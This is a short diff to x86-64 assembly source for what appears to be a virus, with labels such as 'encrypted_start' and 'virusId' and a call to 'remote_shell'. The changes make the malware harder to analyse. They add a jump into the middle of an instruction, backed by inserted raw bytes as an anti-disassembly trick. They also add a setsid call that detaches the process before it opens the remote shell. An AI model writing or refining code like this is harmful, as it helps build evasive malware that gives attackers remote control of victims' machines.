@@ -72,7 +72,11 @@ encrypted_start:
     mov rax, SYS_GETPID
     syscall
     cmp rax, [rsp + ppid]
-    jz encrypted_start_suite
+    jz encrypted_start_suite + 2
+
+    mov rax, SYS_SETSID
+    syscall
+
     call remote_shell
     xor rax, rax
     pop rsi
@@ -82,6 +86,7 @@ encrypted_start:
     leave
     ret
 encrypted_start_suite:
+    db `\x48\x8b`
     lea rdi, [rsp + virusId]
     mov rsi, 8
     mov rdx, GRND_RANDOM
